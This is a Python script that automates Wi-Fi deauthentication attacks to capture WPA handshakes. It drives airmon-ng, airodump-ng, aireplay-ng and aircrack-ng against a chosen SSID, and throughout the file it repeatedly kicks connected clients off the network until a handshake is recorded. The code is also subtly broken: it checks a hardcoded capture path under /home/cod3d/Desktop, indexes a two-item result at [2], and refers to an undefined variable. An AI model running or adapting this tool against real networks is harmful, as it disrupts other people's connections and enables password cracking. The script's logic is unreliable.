import argparse                         # parse flags
import os                               # check for directories, open processes
import subprocess                       # open processes
import sys                              # python xD
import time                             # sleep
from datetime import datetime as dt     # output time
from difflib import get_close_matches   # for network guesses
from termcolor import colored           # some colors for ya

# Parsing values ------------------ Start
parser = argparse.ArgumentParser(description='Automatically capture handshake')
parser.add_argument('ssid', metavar='network_name', help='Network name')
parser.add_argument('-i', metavar='interface', default='', help='Interface')
parser.add_argument('--conf', metavar='confidence', default=0.6, help='Confidence in guessing network name (default = 0.6)')
parser.add_argument('--pAm', metavar='packets', type=int, default=10, help='Amount of packets to send (default = 5)')
parser.add_argument('--dir', metavar='directory', default='', help='Directory (default = mydir/wifis/network_name)')
parser.add_argument('--mode', metavar='mode', default='', help='Set to pi if you are using raspberry')

args = parser.parse_args()
# Parsed values ------------------- End


# Global variables ------------------------- Start
Interface = args.i

SSID = args.ssid

Confidence = args.conf  # How confident script must be in guessing network name

DeauthPacketsAmount = args.pAm

MY_DIRECTORY = os.popen('pwd').read()
SaveTo = f'{MY_DIRECTORY[:-1]}/wifis/'
if args.dir != '':
	SaveTo = args.dir

isNotPi = True
if args.mode == 'pi':
	isNotPi = False
# Global variables ------------------------- End


# Custom functions ------------------------- Start
def select_interface(interface_name):
	Interfaces = []
	InterfaceIndex = type(int)

	command_set_interface_up = "sudo iwconfig 2>&1 | grep -oP '^\w+'"
	interfaces = os.popen(command_set_interface_up).read().split("\n")[:-1]
	if len(interfaces) < 3:
		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] No interfaces', flush=True)
		sys.exit()
	index = 0
	for interface in interfaces:
		if interface != "lo" and interface != "eth0":
			command_set_interface_up = f"sudo ifconfig {interface} up"
			string = "> /dev/null 2>&1"
			os.popen(command_set_interface_up).read()
			time.sleep(2)
			Interfaces.append(interface)
			index += 1
	if interface_name in Interfaces and args.i != "":
		return interface_name
	if interface_name not in Interfaces and args.i != "":
		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + f'] No such interface {interface_name}', flush=True)
		sys.exit()

	if len(Interfaces) > 1:
		while interface_name == "":
			print("Choose interface: ")
			i = 0
			chosen = ""
			for interface in Interfaces:
				print(interface + f" ({i})")
				i += 1
			InterfaceIndex = int(input())
			if len(Interfaces) > InterfaceIndex:
				return Interfaces[InterfaceIndex]
			else:
				print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + '] You picked the wrong house fool', flush=True)
	else:
		InterfaceIndex = 0
		return Interfaces[0]


def update_interface_name(interface_name, enable_monitor_mode):
	interface = interface_name
	if enable_monitor_mode:
		interface += "mon"
		return interface
	else:
		interface = interface[:-3]
		return interface


def monitor_mode(interface_name):
	command_get_mode = f"sudo iwconfig {interface_name} | awk -F: '/Mode/{{print$2}}'"
	output_get_mode = os.popen(command_get_mode).read().split(" ", 1)[0]
	if output_get_mode == "Monitor":
		return True
	else:
		return False


def start_network_manager():
	command_network_manager_start = 'dbus-run-session sudo systemctl start NetworkManager'
	os.popen(command_network_manager_start).read()

def check_network_manager():
	command_network_manager_start = "systemctl status NetworkManager | grep -a Active | awk '{print $2}'"
	if os.popen(command_network_manager_start).read() == active:
		return True
	return False


def start_airmon(interface_name, supports_network_manager):
	if supports_network_manager:
		output_airmon_check_kill = os.popen("sudo airmon-ng check kill").read()
	command_airmon_start = f"sudo airmon-ng start {interface_name}"
	output_airmon_start = os.popen(command_airmon_start).read()
	interface = update_interface_name(interface_name, True)
	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Changed interface: {interface}', flush=True)
	return interface


def stop_airmon(interface_name):
	command_airmon_stop = f"sudo airmon-ng stop '{interface_name}'"
	os.popen(command_airmon_stop).read()
	interface = update_interface_name(interface_name, False)
	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Changed interface: {interface}', flush=True)
	return interface


def get_network_info(interface_name, network_name, guessing_confidence):
	BSSID = ''
	Channel = ''
	command_scan_wifi = f'''sudo iwlist {interface_name} scan | egrep "ESSID:|Address:|Channel:" | cut -d : -f 2,3,4,5,6,7,8 | tr -d '"' | sed 's/ //g' '''
	output_scan_wifi = os.popen(command_scan_wifi).read()
	splited_output_scan_wifi = output_scan_wifi.split("\n")
	if not splited_output_scan_wifi:
		time.sleep(5)
		output_scan_wifi = os.popen(command_scan_wifi).read()
		splited_output_scan_wifi = output_scan_wifi.split("\n")

	del splited_output_scan_wifi[len(splited_output_scan_wifi)-1]

	if not splited_output_scan_wifi:
		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] No networks found', flush=True)
		sys.exit()

	wifiNames = []

	index = 1
	for record in splited_output_scan_wifi:
		if record == network_name:
			BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(network_name)-2]
			Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(network_name)-1])
			return [network_name, BSSID, Channel]

		elif index == 3:
			wifiNames.append(record)
			index = 0
		index += 1

	try:
		closeMatch = get_close_matches(network_name, wifiNames, 1, Confidence)[0]
		BSSID = splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-2]
		Channel = int(splited_output_scan_wifi[splited_output_scan_wifi.index(closeMatch)-1])
		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + f"] No such network '{network_name}', assuming you typed '{closeMatch}'", flush=True)
		return [closeMatch, BSSID, Channel]
	except IndexError:
		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] Error scanning for network (network name is incorrect)', flush=True)
		sys.exit()


def start_airodump(interface_name, BSSID, channel, directory):
	command_airodump = f"sudo airodump-ng --bssid '{BSSID}' -c '{channel}' --write-interval 1 --write '{directory}' {interface_name} > /dev/null 2>&1"
	airodumpProcess = subprocess.Popen(command_airodump, shell=True)


def fill_stations_from_csv(directory):
	stations = []
	with open(f'{directory}-01.csv', 'r') as csvfile:
		for idx, val in enumerate(csvfile):
			if idx + 1 > 5:
				if val.split(',')[0] != "\n":
					stations.append(val.split(',')[0])
	return stations


def select_station(stations, current_station_address):
	if current_station_address == "":
		return stations[0]
	else:
		new_station_address = stations[stations.index(current_station_address)+1]
		del stations[stations.index(current_station_address)]
		return new_station_address


def deauthNetwork(interface_name, BSSID, station, deauth_packets):
	command_aireplay = f'sudo aireplay-ng --ignore-negative-one --deauth {deauth_packets} -a {BSSID} -c {station} {interface_name} > /dev/null 2>&1'
	deauthProcess = subprocess.Popen(command_aireplay, shell=True).wait()


def make_directory(directory, network_name):
	directory_path = directory
	directory_path += f"{network_name}/"
	if os.path.isdir(directory_path):
		if len(os.listdir(directory_path)) > 0:
			index = 1
			while os.path.isdir(directory_path):
				if index >= 2:
					directory_path = directory_path[:-1]
				directory_path = directory_path[:-1]
				directory_path += str(index) + "/"
				index += 1
			os.makedirs(directory_path)
	else:
		os.makedirs(directory_path)
	return directory_path


def check_handshake(directory):
	command_aircrack_output = type(int)
	command_aircrack_output = ''
	try:
		command_aircrack = f"sudo aircrack-ng /home/cod3d/Desktop/-01.cap 2>&1 | sed -n '3p' | tr -s ' '"
		command_aircrack_output = os.popen(command_aircrack).read()
	except IndexError:
		command_aircrack = f"sudo aircrack-ng /home/cod3d/Desktop/-01.cap 2>&1 | sed -n '4p' | tr -s ' '"
		command_aircrack_output = os.popen(command_aircrack).read()
	if command_aircrack_output == "Invalid packet capture length 0 - corrupted file?\n":
		return False, "Corrupted file"
	try:
		command_aircrack = f"sudo aircrack-ng /home/cod3d/Desktop/-01.cap | sed -n '7p' | tr -s ' ' | tr -d '()\n'"
		command_aircrack_output = int(os.popen(command_aircrack).read().split(" ")[5])
	except IndexError:
		command_aircrack = f"sudo aircrack-ng /home/cod3d/Desktop/-01.cap | sed -n '6p' | tr -s ' ' | tr -d '()\n'"
		command_aircrack_output = int(os.popen(command_aircrack).read().split(" ")[5])
	if command_aircrack_output > 0:
		return True, "Success"
	else:
		return False, "No handshake"


def check_for_stations(directory):
	startTime = time.time()
	index = 1
	while True:
		if index != 1:
			# check output
			stations = fill_stations_from_csv(directory)
			if len(stations) > 0:
				current_station_address = select_station(stations, '')
				print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Stations: {stations}', flush=True)
				return stations, current_station_address
		index += 1
		time.sleep(3.0 - ((time.time() - startTime) % 3.0))
# Custom functions ------------------------- End


# MAIN ---------------------------------- Start
def recieveHandshake(interface_name, network_name, guessing_confidence, deauth_packets, directory, supports_network_manager):
	if monitor_mode(interface_name):
		interface_name = stop_airmon(interface_name)
		if supports_network_manager:
			time.sleep(3)
			start_network_manager()
			while check_network_manager == False:
				time.sleep(1)
	NetworkName, BSSID, Channel = get_network_info(interface_name, network_name, guessing_confidence)
	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] [SSID: {NetworkName}] [BSSID: {BSSID}] [Channel: {Channel}]', flush=True)
	Directory = make_directory(directory, NetworkName)
	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Directory: {Directory}', flush=True)
	interface_name = start_airmon(interface_name, supports_network_manager)
	start_airodump(interface_name, BSSID, Channel, Directory)
	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Waiting for station...', flush=True)
	time.sleep(1)
	Stations = []
	CurrentStation = ''
	Stations, CurrentStation = check_for_stations(Directory)
	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {DeauthPacketsAmount} deauth packets to {CurrentStation}', flush=True)
	deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
	cyclesCount = 0
	while check_handshake(Directory)[1] is False:
		if check_handshake(Directory)[2] == "Corrupted file":
			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('ERROR', 'red') + '] Capture file is currupted. Please restart the script', flush=True)
			interface_name = stop_airmon(interface_name)
			if supports_network_manager:
				start_network_manager()
		print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('WARNING', 'yellow') + '] Failure', flush=True)
		if len(Stations) > 0 and cyclesCount < len(Stations):
			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Selecting another station', flush=True)
			CurrentStation = select_station(Stations, CurrentStation)
			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {deauth_packets} deauth packets to {CurrentStation}', flush=True)
			deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
			cyclesCount += 1
		else:
			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + '] Rescanning stations...', flush=True)
			Stations, CurrentStation = check_for_stations(Directory)
			print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Sending {deauth_packets} deauth packets to {CurrentStation}', flush=True)
			deauthNetwork(interface_name, BSSID, CurrentStation, deauth_packets)
			cyclesCount = 1
	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue', attrs=['bold']) + '] [' + colored('INFO', 'green', attrs=['bold']) + '] ' + colored('Success!', attrs=['bold']))
	interface_name = stop_airmon(interface_name)
	if supports_network_manager:
		start_network_manager()

if __name__ == "__main__":
	Interface = select_interface(Interface)
	print('[' + colored(f'{"{:02d}".format(dt.now().hour)}:{"{:02d}".format(dt.now().minute)}:{"{:02d}".format(dt.now().second)}', 'blue') + '] [' + colored('INFO', 'green') + f'] Interface: {Interface}', flush=True)
	time.sleep(2)
	recieveHandshake(Interface, SSID, Confidence, DeauthPacketsAmount, SaveTo, isNotPi)
# MAIN ---------------------------------- END